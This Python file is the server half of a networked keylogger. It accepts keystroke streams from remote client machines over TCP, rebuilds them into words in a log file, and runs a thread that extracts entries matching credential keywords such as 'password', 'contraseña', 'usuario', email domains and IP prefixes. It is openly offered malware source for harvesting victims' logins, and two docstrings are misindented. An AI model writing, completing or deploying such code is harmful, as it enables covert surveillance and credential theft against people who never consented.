import socket
import sys
import threading
import time

LOGGER_FILE = 'keylogger.txt'
READER_FILE = 'logger_analysis.txt'


class Server(threading.Thread):
    _msg = []
    _special_key = ['Key.space', 'Key.enter', 'Key.backspace']
    _command_key = ['Key.shift', 'Key.shift_r', 'Key.ctrl_l', 'Key.ctrl_r', 'Key.tab', 'Key.alt_l', 'Key.alt_gr',
                    'Key.ctrl_lKey.alt_gr']
    _function_key = [f'Key.f{f}' for f in range(1, 13)]
    _move_key = ['Key.down', 'Key.up', 'Key.left', 'Key.right']

    def __init__(self):
        super().__init__()
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            # Ports prepared to perform TCP conection
            # sock.bind(('192.168.9.55', 8084))
            self.socket.bind(('192.168.9.55', 8083))
            print('[+] Servidor levantado! ')
        except socket.error as e:
            print(f'[!] Bind error: {e}')
            sys.exit()

    def run(self):
        try:
            # Server listening for conection reached on client side and run 
            # untill 5 clients in diferent threads, one by client
            self.socket.listen(5)
            while True:
                conn, addr = self.socket.accept()
                print(f'[+] Conexión con  {addr[0]} : {addr[1]}')

                com = threading.Thread(target=self._client_thread, args=(conn, addr))
                com.start()

        except Exception as e:
            print('[!] Error en la conexion.', e)

        finally:
            print('[-] Servidor cerrado.')
            self.socket.close()

    def _key_handler(self, data):
        """
        Perform data decoded analysis
        """
        
        # Append to self.msg list only if data is alfanumeric
        if data not in self._special_key:
            if data not in (self._command_key + self._function_key + self._move_key):
                data = data.replace("'", '')
                self._msg.append(data)

        # If detect a backspace, drop last position from message in order to have a complete word like in client side
        elif data == 'Key.backspace':
            if len(self._msg) > 1:
                self._msg.pop()
            elif len(self._msg) == 1:
                self._msg = []

        # Save the word when detect space o enter keys
        elif data == 'Key.space' or data == 'Key.enter':
            # Join all characters in list in order to have a clean word to write
            self._msg = ''.join(self._msg)
            if data == 'Key.space':
                self._msg = f"{self._msg} "

            self._update_keylogger(new_line=data == 'Key.enter')
            self._msg = []

    def _update_keylogger(self, new_line):
    """
    Add complete words to logger file
    param new_line: If client press enter key
    """
        with open(LOGGER_FILE, 'a') as file:
            file.write(str(self._msg))
            if new_line:
                file.write('\r\n')

    def _client_thread(self, conn, addr):
    """
    Thread that handle the listening
    """
    
        while True:
            try:
                data = conn.recv(1024).decode('utf-8')

                self._key_handler(data)

                if not data:
                    break
            except ConnectionResetError as e:
                print(f'{e}')

            except Exception as e:
                print(e)

        print(f"[-] Conexión cerrada con {addr[0]} : {addr[1]}")
        conn.close()


def read_logger(file):
    """
    Perform the match between logged keys and key words
    """
    
    KEY_WORDS = ['@', '.com', '.es', 'user', 'password', '192.', 'contraseña', 'usuario', 'windows', 'linux', 'mac']
    word_number = 0
    words_find = []
    while True:
        try:
            with open(file) as f:
                # Read logged lines
                for line in f:
                    # Loop over each word in line and save its position on file
                    for word in line.split():
                        word_number += 1
                        with open(READER_FILE, 'a') as output_f:
                            # Loop over each key word and if logged word matchs, write it and save
                            # position in order to avoid repeat it
                            for key in KEY_WORDS:
                                if key in word and word_number not in words_find:
                                    words_find.append(word_number)
                                    output_f.writelines(f'{word}\n')

                word_number = 0

        except Exception as e:
            print('[!] Error en la lectura del fichero de log. {}'.format(e))
            time.sleep(15)


if __name__ == '__main__':
    # Execute server and reader thread
    server = Server()
    reader = threading.Thread(target=read_logger, args=(LOGGER_FILE,))

    server.start()
    reader.start()
